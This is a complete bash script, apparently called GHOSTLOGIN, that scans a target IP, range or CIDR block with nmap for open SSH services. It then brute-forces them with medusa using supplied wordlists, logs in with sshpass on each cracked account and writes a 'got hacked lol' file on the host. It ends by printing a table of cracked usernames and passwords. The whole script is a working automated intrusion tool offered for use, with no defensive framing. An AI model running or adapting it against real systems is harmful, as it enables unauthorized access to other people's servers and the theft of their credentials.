#!/bin/env bash

banner() {
clear
cat << "EOF"
╔═══════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
║ ▒██   ██▒     ▄████  ██░ ██  ▒█████    ██████ ▄▄▄█████▓ ██▓     ▒█████    ▄████  ██▓ ███▄    █    ▒██   ██▒   ║ 
║ ▒▒ █ █ ▒░    ██▒ ▀█▒▓██░ ██▒▒██▒  ██▒▒██    ▒ ▓  ██▒ ▓▒▓██▒    ▒██▒  ██▒ ██▒ ▀█▒▓██▒ ██ ▀█   █    ▒▒ █ █ ▒░   ║ 
║ ░░  █   ░   ▒██░▄▄▄░▒██▀▀██░▒██░  ██▒░ ▓██▄   ▒ ▓██░ ▒░▒██░    ▒██░  ██▒▒██░▄▄▄░▒██▒▓██  ▀█ ██▒   ░░  █   ░   ║ 
║  ░ █ █ ▒    ░▓█  ██▓░▓█ ░██ ▒██   ██░  ▒   ██▒░ ▓██▓ ░ ▒██░    ▒██   ██░░▓█  ██▓░██░▓██▒  ▐▌██▒    ░ █ █ ▒    ║ 
║ ▒██▒ ▒██▒   ░▒▓███▀▒░▓█▒░██▓░ ████▓▒░▒██████▒▒  ▒██▒ ░ ░██████▒░ ████▓▒░░▒▓███▀▒░██░▒██░   ▓██░   ▒██▒ ▒██▒   ║ 
║ ▒▒ ░ ░▓ ░    ░▒   ▒  ▒ ░░▒░▒░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░  ▒ ░░   ░ ▒░▓  ░░ ▒░▒░▒░  ░▒   ▒ ░▓  ░ ▒░   ▒ ▒    ▒▒ ░ ░▓ ░   ║ 
║ ░░   ░▒ ░     ░   ░  ▒ ░▒░ ░  ░ ▒ ▒░ ░ ░▒  ░ ░    ░    ░ ░ ▒  ░  ░ ▒ ▒░   ░   ░  ▒ ░░ ░░   ░ ▒░   ░░   ░▒ ░   ║ 
║  ░    ░     ░ ░   ░  ░  ░░ ░░ ░ ░ ▒  ░  ░  ░    ░        ░ ░   ░ ░ ░ ▒  ░ ░   ░  ▒ ░   ░   ░ ░     ░    ░     ║ 
║  ░    ░           ░  ░  ░  ░    ░ ░        ░               ░  ░    ░ ░        ░  ░           ░     ░    ░     ║ 
╚═══════════════════════════════════════════════════════════════════════════════════════════════════════════════╝

EOF


#Validating an IP Address in a Bash Script
#by Mitch Frazier on June 26, 2008
#https://www.linuxjournal.com/content/validating-ip-address-bash-script
}

function valid_ip()
{
    local  ip=$1
    local  stat=1

    if [[ $ip =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
        OIFS=$IFS
        IFS='.'
        ip=($ip)
        IFS=$OIFS
        [[ ${ip[0]} -le 255 && ${ip[1]} -le 255 \
            && ${ip[2]} -le 255 && ${ip[3]} -le 255 ]]
        stat=$?
    fi
    return $stat
}

ip_to_int() {
    local IFS=.   #changes the internal field seperator to a dot
    read -r a b c d <<< "$1" #splits the ip
    echo $(( (a << 24) + (b << 16) + (c << 8) + d )) # convets to ineger using bit shifting.
}


# Source - https://stackoverflow.com/a
# Posted by ghoti
# Retrieved 2026-01-25, License - CC BY-SA 4.0

valid_cidr_network() {
  local ip="${1%/*}"    # strip bits to leave ip address
  local bits="${1#*/}"  # strip ip address to leave bits
  local IFS=.; local -a a=($ip)

  # Sanity checks (only simple regexes)
  [[ $ip =~ ^[0-9]+(\.[0-9]+){3}$ ]] || return 1
  [[ $bits =~ ^[0-9]+$ ]] || return 1
  [[ $bits -gt 32 ]] && return 1

  # Create an array of 8-digit binary numbers from 0 to 255
  local -a binary=({0..1}{0..1}{0..1}{0..1}{0..1}{0..1}{0..1}{0..1})
  local binip=""

  # Test and append values of quads
  for quad in {0..3}; do
    [[ "${a[$quad]}" -gt 255 ]] && return 1
    printf -v binip '%s%s' "$binip" "${binary[${a[$quad]}]}"
  done

  # Fail if any bits are set in the host portion
  [[ ${binip:$bits} = *1* ]] && return 1

  return 0
}


validate_ip_input() {
    local input="$1"

    # checks if it's a CIDR notation
    if [[ $input == *"/"* ]]; then
        valid_cidr_network "$input"
        return $?
    fi

    # checks if it's an ip range notation
    if [[ $input == *"-"* ]]; then
        local start=$(echo "$input" | cut -d'-' -f1)
        local end=$(echo "$input" | cut -d'-' -f2)

        # makes sure that both ips are valid
        if ! valid_ip "$start" || ! valid_ip "$end"; then
            return 1
        fi

        # makes sure that in the range the start is before the end
        local start_int=$(ip_to_int "$start")
        local end_int=$(ip_to_int "$end")

        if [[ $start_int -le $end_int ]]; then
            return 0
        else
            return 1
        fi
    fi

    # otherwise treats it as a single ip address.
    valid_ip "$input"
    return $?
}

banner

while true; do
  read -n 1 -p "Perform automatic brute forcing? [y/n]: " choice
  echo ""
  case "$choice" in
    y|Y)
      banner
      echo "Will perform automatic bruteforcing."
      bruteforcing="1"
      break
      ;;
    n|N)
      banner
      echo "Will not perform automatic bruteforcing."
      bruteforcing="2"
      break
      ;;
    *)
      echo "Invalid input."
      ;;
  esac
done

#a loop that keeps asking for ip target until the format is validated
while true; do
  read -p "Target: " TARGET
 if validate_ip_input "$TARGET"; then
    banner
    break
  else
    echo "Invalid target format."
  fi
done


# a loop that keeps asking for user and password wordlists until their location is validated.
if [[ $bruteforcing == "1" ]]; then
  while true; do
    read -e -p "user list: " USER_LIST
    banner
    read -e -p "pass list: " PASS_LIST

    if [[ -f $USER_LIST && -f $PASS_LIST ]]; then
      break
    else
      echo "One of the brute force lists not found. Try again."
    fi
  done
fi


banner

# nmap scan function. probes for open services and seeks out services version. outputs it in a grepable format.
nmap_scan() {
  nmap --open -sV -oG results.gnmap "$TARGET" >/dev/null 2>&1
}

tput civis
echo "Scanning for SSH..."
nmap_scan

# filters nmap results for a format to pipe into medusa. 
awk '
/Host:/ && /ssh/ {
    ip=$2
    n=split($0,a,"Ports: ")
    split(a[2],ports,",")
    for (i in ports) {
        if (ports[i] ~ /open\/tcp\/\/ssh/) {
            split(ports[i],p,"/")
            print ip, p[1]
        }
    }
}
' results.gnmap > ssh_targets.txt

banner

#variable of how many targets were found
target_count=$(wc -l < ssh_targets.txt)

declare -a credentials=() #declares variable with attributes

  #launches medusa only if bruteforcing is enabled.
if [[ $bruteforcing == "1" ]]; then
  echo "Found $target_count SSH targets. Attempting brute force..."

  # a loop that runs medusa with target's info and selected wordlists
  while read ip port; do

    # Automatic bruteforcing with medusa
    medusa_output=$(medusa -h "$ip" -n "$port" -U "$USER_LIST" -P "$PASS_LIST" -M ssh 2>&1)
    
    #if medusa is successful, extract all successful credentials
    if echo "$medusa_output" | grep -q "SUCCESS"; then

      #loop through each successful login found by medusa
      while IFS= read -r success_line; do

        #sets into the variables just the right credentials out of the line
        username=$(echo "$success_line" | grep -oP 'User:\s*\K[^\s]+' 2>/dev/null || echo "$success_line" | sed -n 's/.*User:\s*\([^ ]*\).*/\1/p')
        password=$(echo "$success_line" | grep -oP 'Password:\s*\K[^\s\[]+' 2>/dev/null || echo "$success_line" | sed -n 's/.*Password:\s*\([^ \[]*\).*/\1/p')

        echo "Launching payloads on ${ip}:${port} with user ${username}"

        #running sshpass with the right target info, it creates the example file into the machine. then saves it into the variable.
        ssh_output=$(sshpass -p "$password" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10 -p "$port" "$username@$ip" 'echo "got hacked lol" > hacked.txt 2>&1 && ls -la hacked.txt 2>&1 && pwd 2>&1' </dev/null 2>&1)

        #takes the sshpass output and extracts the path of the created file and saves it into the filepath variable.
        filepath=$(echo "$ssh_output" | tail -1)


        if echo "$ssh_output" | grep -q "hacked.txt"; then
          filepath="${filepath}/hacked.txt"
        else
          filepath="[creation failed]"
        fi

        credentials+=("${ip}:${port} ${username} ${password} ${filepath}")
      done < <(echo "$medusa_output" | grep "SUCCESS") #piping the medusa output lines with success into the loop,
    fi
  done < ssh_targets.txt
else

  #if bruteforcing is disabled, skips medusa.
  echo "Found $target_count SSH targets. Skipping brute force."
fi

sleep 3
banner


if [[ ${#credentials[@]} -eq 0 ]]; then
  #if no credentials are found
    echo "No log-ins."
    echo ""
    echo "SSH services scanned:"
    #prints out results
    column -t ssh_targets.txt
else
    echo "Targets found:"
    echo ""
    printf "%-18s %-6s %-15s %-15s %s\n" "IP" "PORT" "USERNAME" "PASSWORD" "FILE PATH"
    echo ""

    #prints out the targets with their info
    for cred in "${credentials[@]}"; do
        read ip_port user pass path <<< "$cred"
        ip=$(echo "$ip_port" | cut -d: -f1)
        port=$(echo "$ip_port" | cut -d: -f2)
        printf "%-18s %-6s %-15s %-15s %s\n" "$ip" "$port" "$user" "$pass" "$path"
    done
fi

